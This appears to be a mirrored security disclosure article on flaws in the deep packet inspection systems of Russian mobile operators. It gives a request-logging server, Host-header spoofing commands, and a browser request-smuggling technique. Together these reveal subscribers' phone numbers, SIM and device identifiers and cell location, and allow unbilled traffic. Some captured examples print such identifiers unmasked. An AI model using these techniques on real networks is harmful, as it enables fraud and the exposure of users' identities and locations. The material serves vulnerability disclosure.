<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>DPI of mobile operators: from free Internet to number and location disclosure</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Deep traffic analysis systems (Deep Packet Inspection, DPI) - hardware and software systems for classifying passing Internet traffic by data type (web...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>DPI of mobile operators: from free Internet to number and location disclosure</h1><div class="post__text post__text-html js-mediator-article">  Deep traffic analysis systems (Deep Packet Inspection, DPI) - hardware and software systems for classifying passing Internet traffic by data type (web page, document, audio, video), protocol (HTTP, BitTorrent, VoIP / SIP) and specific programs (Skype, WhatsApp), often with additional functionality.  DPI systems are distributed and used worldwide by wired and wireless access providers. <br><br>  Mobile operators use in-depth traffic analysis systems, first of all, to prioritize different content on the Internet (QoS), so that they can download a large file and watch videos on YouTube at the same time, and that one cellular user who actively uses the Internet does not create problems for other users. .  Operators use DPI from about the beginning of the two thousandth, with the advent of UMTS (3G), to more or less honestly share a wireless channel of limited bandwidth. <br><br>  Mobile operators also use other DPI features, for example, TCP and HTTP traffic acceleration (TCP PEP, Performance-enhancing Proxy), to speed up the Internet on mobile networks and identify users by websites.  If you try to enter the operator‚Äôs personal account from the phone, on many operators it will open immediately, without the need to enter your login and password.  Or, that could be found 5 years ago, a simple call on a suspicious website or a click on an advertising banner from an Android game turned into an automatic subscription to a paid service, which could be found in the SMS message. <a name="habracut"></a>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h2>  How it works </h2><br>  The system of in-depth analysis of traffic is configured in such a way that it adds HTTP service headers when executing an HTTP request to sites (hosts) from the list defined by the operator.  The headers can contain the internal IP address of the subscriber, the telephone number (MSISDN), IMEI and IMSI identifiers, the identifier of the base station (tower) to which the subscriber is connected (ECI / TAC). <br><br>  We will need to install a simple HTTP server on the Internet server, which will receive the request, display it on the screen, and send an HTTP response.  Something like that: <br><br><pre><code class="hljs pgsql">#!/usr/bin/env python3 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> socketserver <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> MyTCPHandler(socketserver.BaseRequestHandler): def handle(self): <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-keyword"><span class="hljs-keyword">True</span></span>: r = self.request.recv(<span class="hljs-number"><span class="hljs-number">8192</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> b"\r\n\r\n" <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> r <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> b"\n\n" <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> r: break <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> r: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> print("-----\r\n" + r.decode() + "-----") self.request.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\n") self.request.sendall(b"OK") <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> __name__ == "__main__": HOST, PORT = "0.0.0.0", <span class="hljs-number"><span class="hljs-number">80</span></span> socketserver.ForkingTCPServer.allow_reuse_address = <span class="hljs-keyword"><span class="hljs-keyword">True</span></span> <span class="hljs-keyword"><span class="hljs-keyword">server</span></span> = socketserver.ForkingTCPServer((HOST, PORT), MyTCPHandler) <span class="hljs-keyword"><span class="hljs-keyword">server</span></span>.allow_reuse_address = <span class="hljs-keyword"><span class="hljs-keyword">True</span></span> <span class="hljs-keyword"><span class="hljs-keyword">server</span></span>.serve_forever()</code> </pre> <br>  Send an HTTP request using a Megaphone SIM card: <br><br><pre> <code class="hljs ruby">$ curl myserver.com OK</code> </pre> <br>  On the server came: <br><br><pre> <code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">GET</span></span> / HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> Host: myserver.com <span class="hljs-keyword"><span class="hljs-keyword">User</span></span>-Agent: curl/<span class="hljs-number"><span class="hljs-number">7.51</span></span><span class="hljs-number"><span class="hljs-number">.0</span></span> Accept: *<span class="hljs-comment"><span class="hljs-comment">/*</span></span></code> </pre><br>  Nothing unusual.  Let's change the Host header to some internal domain of the operator, for example, to the main site megafon.ru: <br><br><pre> <code class="hljs ruby">$ curl myserver.com -H <span class="hljs-string"><span class="hljs-string">"Host: megafon.ru"</span></span></code> </pre> <br>  On server: <br><br><pre> <code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">GET</span></span> / HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> Host: megafon.ru <span class="hljs-keyword"><span class="hljs-keyword">User</span></span>-Agent: curl/<span class="hljs-number"><span class="hljs-number">7.51</span></span><span class="hljs-number"><span class="hljs-number">.0</span></span> Accept: *<span class="hljs-comment"><span class="hljs-comment">/* X-Real-IP: 100.114.20.123 X-NOKIA-MSISDN: 79319350195</span></span></code> </pre><br>  Not only the HTTP headers sent by curl came to the server, but also the additional <b>X-Real-IP</b> and <b>X-NOKIA-MSISDN</b> headers containing the internal IP address (for Carrier-grade NAT) and the phone number! <br><br>  Why did this happen?  Apparently, when compiling the list, they forgot to link specific domains to specific IP addresses or ranges, and checking the opening of a site from a list is done only by comparing the HTTP <b>Host</b> header. <br><br>  Frequently, access to internal sites is not charged by operators, which allows you to get <b>free Internet by</b> simply replacing the <b>Host</b> HTTP request header. <br><br><h2>  Special hosts </h2><br><h3>  Megaphone </h3><br>  <b>Megaphone</b> has a lot of internal hosts for which DPI adds different headers: <br><br><ul><li>  <b>welcome.megafonnw.ru</b> adds <b>X-MegaFon-IMSI</b> header with a SIM-card identifier (IMSI) </li><li>  <b>wap.megafon.ru</b> adds <b>X-Megafon-IMEISV</b> with a phone identifier (IMEI) </li><li>  <b>id.megafon.ru</b> reveals the numbers of the towers to which the phone is currently connected in the headers of <b>X-Megafon-TAC</b> and <b>X-Megafon-ECI</b> </li><li>  The site of a specific region (for example, <b>szfwp.megafon.ru</b> ) adds the header <b>X-3GPP-USER-LOCATION-INFO</b> </li></ul><br>  Also service headers are added for zg.megafon.ru, m.megafon.ru and igapi.megafon.ru. <br><br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">GET</span></span> / HTTP/<span class="hljs-number"><span class="hljs-number">1</span></span>.<span class="hljs-number"><span class="hljs-number">1</span></span> Host: welcome.megafonnw.ru User-Agent: curl/<span class="hljs-number"><span class="hljs-number">7</span></span>.<span class="hljs-number"><span class="hljs-number">51</span></span>.<span class="hljs-number"><span class="hljs-number">0</span></span> Accept: */* X-MegaF<span class="hljs-literal"><span class="hljs-literal">on</span></span>-IMSI: <span class="hljs-number"><span class="hljs-number">250021075120189</span></span> X-NOKIA-MSISDN: <span class="hljs-number"><span class="hljs-number">79319350195</span></span> ----- GET / HTTP/<span class="hljs-number"><span class="hljs-number">1</span></span>.<span class="hljs-number"><span class="hljs-number">1</span></span> Host: wap.megafon.ru User-Agent: curl/<span class="hljs-number"><span class="hljs-number">7</span></span>.<span class="hljs-number"><span class="hljs-number">51</span></span>.<span class="hljs-number"><span class="hljs-number">0</span></span> Accept: */* X-3GPP-SGSN-MCC-MNC: <span class="hljs-number"><span class="hljs-number">25002</span></span> X-MegaF<span class="hljs-literal"><span class="hljs-literal">on</span></span>-APN: internet X-3GPP-SGSN-IP: <span class="hljs-number"><span class="hljs-number">83.149.50.45</span></span> X-NOKIA-MSISDN: <span class="hljs-number"><span class="hljs-number">79319350195</span></span> X-MegaF<span class="hljs-literal"><span class="hljs-literal">on</span></span>-IP: <span class="hljs-number"><span class="hljs-number">100.114.20.123</span></span> X-Megafon-IMEISV: <span class="hljs-number"><span class="hljs-number">456745268125902</span></span> ----- GET / HTTP/<span class="hljs-number"><span class="hljs-number">1</span></span>.<span class="hljs-number"><span class="hljs-number">1</span></span> Host: m.megafon.ru User-Agent: curl/<span class="hljs-number"><span class="hljs-number">7</span></span>.<span class="hljs-number"><span class="hljs-number">51</span></span>.<span class="hljs-number"><span class="hljs-number">0</span></span> Accept: */* X-NOKIA-MSISDN: <span class="hljs-number"><span class="hljs-number">79319350195</span></span> X-3GPP-SGSN-MCC-MNC: <span class="hljs-number"><span class="hljs-number">25002</span></span> ----- GET / HTTP/<span class="hljs-number"><span class="hljs-number">1</span></span>.<span class="hljs-number"><span class="hljs-number">1</span></span> Host: id.megafon.ru User-Agent: curl/<span class="hljs-number"><span class="hljs-number">7</span></span>.<span class="hljs-number"><span class="hljs-number">51</span></span>.<span class="hljs-number"><span class="hljs-number">0</span></span> Accept: */* X-NOKIA-MSISDN: <span class="hljs-number"><span class="hljs-number">79319350190</span></span> X-Megafon-TAC: 1FB1 X-Megafon-ECI: AB82375</code> </pre></div></div><br><h3>  Tele 2 </h3><br>  There were special hosts to which requests <b>X-MSISDN</b> and <b>X-FORWARDED-FOR</b> service headers were added: <br><br><ul><li>  login.tele2.ru </li><li>  market.tele2.ru </li><li>  oplata.tele2.ru </li><li>  play.tele2.ru </li><li>  wap.tele2.ru </li><li>  block.tele2.ru </li></ul><br>  The <b>X-MSISDN</b> header contained the Tele2 client phone number.  The <b>X-FORWARDED-FOR</b> header contains the internal IP address of the client. <br><br>  Tele2 uses Ericsson's DPI.  It was reconfigured in early December, and this problem was fixed. <br><br>  Request example: <br><br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><pre> <code class="hljs pgsql"> : <span class="hljs-keyword"><span class="hljs-keyword">GET</span></span> / HTTP/<span class="hljs-number"><span class="hljs-number">1.0</span></span> Host: block.tele2.ru <span class="hljs-keyword"><span class="hljs-keyword">User</span></span>-Agent: Firefox/<span class="hljs-number"><span class="hljs-number">50.0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">Connection</span></span>: keep-alive Accept-<span class="hljs-keyword"><span class="hljs-keyword">Encoding</span></span>: gzip, deflate Accept: *<span class="hljs-comment"><span class="hljs-comment">/* : GET / HTTP/1.0 X-MSISDN: 79502216411 X-FORWARDED-FOR: 10.26.60.210 Host: block.tele2.ru User-Agent: Firefox/50.0 Connection: keep-alive Accept-Encoding: gzip, deflate Accept: */</span></span>*</code> </pre></div></div><br><h3>  Beeline </h3><br>  DPI <b>Beeline</b> in HTTP requests to any IP address with the <code>Host: balance.beeline.ru</code> header, <b>X-Nokia-msisdn</b> and <b>IMEI</b> service headers are added: <br><br><pre> <code class="hljs">‚Ä¶ X-Nokia-msisdn: 79650939376 IMEI: 49727069-021839-00</code> </pre><br>  Request example: <br><br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><pre> <code class="hljs pgsql"> : <span class="hljs-keyword"><span class="hljs-keyword">GET</span></span> / HTTP/<span class="hljs-number"><span class="hljs-number">1.0</span></span> Host: balance.beeline.ru <span class="hljs-keyword"><span class="hljs-keyword">User</span></span>-Agent: Firefox/<span class="hljs-number"><span class="hljs-number">50.0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">Connection</span></span>: keep-alive Accept-<span class="hljs-keyword"><span class="hljs-keyword">Encoding</span></span>: gzip, deflate Accept: *<span class="hljs-comment"><span class="hljs-comment">/* : GET / HTTP/1.0 Host: balance.beeline.ru User-Agent: Firefox/50.0 Connection: keep-alive Accept-Encoding: gzip, deflate Accept: */</span></span>* X-Nokia-msisdn: <span class="hljs-number"><span class="hljs-number">7965093</span></span>xxxx IMEI: <span class="hljs-number"><span class="hljs-number">86875702</span></span>-xxxxxx<span class="hljs-number"><span class="hljs-number">-00</span></span></code> </pre></div></div><br>  Hosts beeline.ru, <a href="http://www.beeline.ru/">www.beeline.ru</a> , spb.beeline.ru are not processed by DPI, they are allowed to connect based on IP-address, and not the <b>Host</b> header. <br><br><h3>  Mts </h3><br>  DPI <b>MTS</b> adds service headers to the following hosts: <br>  * <b>111.mts.ru</b> : <br> <code>X-MSISDN-1hIjUVLgCcdQ: 79118141234 <br> SGSN-MCC-MNC: 25001</code> <br> <br>  * <b>books.mts.ru</b> : <br> <code>X-MSISDN: 79118141234</code> <br> <br>  * <b>pda.mts.ru</b> : <br> <code>X-AQIC5wM2LY4SfcyEwLC5hS0e02r4: 79118141234 <br> SGSN-MCC-MNC: 25001 <br> X-SGSN-IP: 193.27.231.49</code> <br> <br>  * <b>h2o.mts.ru, interceptor.mts.ru, internet.mts.ru</b> : <br> <code>X-MSISDN-B0kOoE2clldi: 79118141234</code> <br> <br><h2>  Package handling considerations </h2><br>  <b>Tele2</b> Proxy adds the following headers for the <b>HTTP / 1.0</b> user request if they are missing: <br><br><pre> <code class="hljs pgsql">Accept-<span class="hljs-keyword"><span class="hljs-keyword">Encoding</span></span>: gzip, deflate Accept: *<span class="hljs-comment"><span class="hljs-comment">/*</span></span></code> </pre><br>  And the following header in the server response, if the request was made over <b>HTTP / 1.1</b> : <br><br><pre> <code class="hljs pgsql">Transfer-<span class="hljs-keyword"><span class="hljs-keyword">Encoding</span></span>: chunked</code> </pre><br>  The answer is chunked-encoding on the proxy side. <br><br>  Proxy buffers or does not miss some requests until it receives a correct answer, and can break large packets into several small ones.  The answer to the <b>GET</b> request will come only after the server starts sending the response <i>body</i> .  The answer will not reach the client, if the server sent only headers, no body. <br>  This feature does not apply to <b>POST</b> requests. <br><br>  If the client sent both HTTP <b>GET request</b> headers and data in one packet, they will be split into two packets by the proxy server: <br><br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><pre> <code class="hljs tex"> : &gt;&gt;&gt; GET / HTTP/1.0<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> Host: block.tele2.ru<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> User-Agent: Firefox/50.0<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> Connection: keep-alive<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> <span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> testdata<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> : &lt;&lt;&lt; GET / HTTP/1.0<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> X-MSISDN: 7950221xxxx<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> X-FORWARDED-FOR: 10.26.xx.xxx<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> Host: block.tele2.ru<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> User-Agent: Firefox/50.0<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> Connection: keep-alive<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> Accept-Encoding: gzip, deflate<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> Accept: */*<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> <span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> &lt;&lt;&lt; testdata<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span></code> </pre></div></div><br>  This feature does not apply to <b>POST</b> requests. <br><br>  DPI Tele2, most likely, does not save state connections (stateless), and tries to look for an HTTP request in each new TCP segment that the client sends.  In addition, the query does not have to begin with the first byte of the segment, but can be divided by line breaks.  For example, the following query is true in terms of DPI: <br><br><pre> <code class="hljs tex"><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> <span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> <span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> <span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> GET / HTTP/1.0<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> Host: ya.ru<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> <span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span></code> </pre><br>  This feature could be exploited through a browser, until Tele2 reconfigured the DPI, and did not limit the service hosts to IP address ranges.  It is possible to create such a POST request of the <code>multipart/form-data</code> (sending files), in the body of which there will be a new HTTP request header, which the DPI will accept as a request during the Keep-Alive session and add service headers, and send it through the browser . <br><br>  Request example: <br><br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><pre> <code class="hljs tex"> : &gt;&gt;&gt; POST / HTTP/1.1 Host: myserver.com User-Agent: Firefox/50.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: keep-alive Pragma: no-cache Cache-Control: no-cache Content-Type: multipart/form-data; boundary=---------------------------436459255605875969489380414 Content-Length: 497 -----------------------------436459255605875969489380414 Content-Disposition: form-data; name="filefile"; filename="tele2_post_test" Content-Type: application/octet-stream <span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> ‚Ä¶ <span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> GET / HTTP/1.0<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> Host: login.tele2.ru<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> User-Agent: Firefox/50.0 <span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> ‚Ä¶ <span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> ---------------------------436459255605875969489380414-- : &lt;&lt;&lt; POST / HTTP/1.1 Host: myserver.com User-Agent: Firefox/50.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: keep-alive Pragma: no-cache Cache-Control: no-cache Content-Type: multipart/form-data; boundary=---------------------------436459255605875969489380414 Content-Length: 497 -----------------------------436459255605875969489380414 Content-Disposition: form-data; name="filefile"; filename="tele2_post_test" Content-Type: application/octet-stream <span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> ‚Ä¶ <span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> X-MSISDN: 7952215xxxx<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> X-FORWARDED-FOR: 10.23.xxx.xx<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> <span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> ‚Ä¶ <span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> GET / HTTP/1.0<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> Host: login.tele2.ru<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> User-Agent: Firefox/50.0 <span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> ‚Ä¶ ---------------------------436459255605875969489380414--</code> </pre></div></div><br>  Remote server received user number.  Apparently, this is a serious flaw in Ericsson's software, and not only Tele2 is inherent. <br><br>  <b>Beeline's</b> DPI analyzes headers, stores the state of the HTTP stream, and slows down or limits data transfer if a non-typical HTTP sending procedure starts, for example, if a client starts to send large data streams in the <i>body of a</i> <b>GET</b> request (after the double \ r \ n, as if it were a POST request), or if the server sends more data than specified in the <b>Content-Length</b> header.  An HTTP request is required, otherwise DPI will not allow the connection. <br><br>  The <b>MTS</b> does not work with sending large data in the headers (apparently, a check is made for the length of the header and its value). <br><br>  For MTS, in order to keep track of new HTTP requests within the keep-alive session, it is necessary to send HTTP response headers and HTTP response bodies from the server in separate packets, without specifying the <b>Content-Length</b> , and with the <b>Content-Type: application / octet</b> header <b>-stream</b> : in the first TCP packet, all headers are transmitted, including \ r \ n \ r \ n, and the second and subsequent packets transmit the data itself. <br><br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><pre> <code class="hljs tex">&gt; GET / HTTP/1.0<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> Host: pda.mts.ru<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span> <span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span 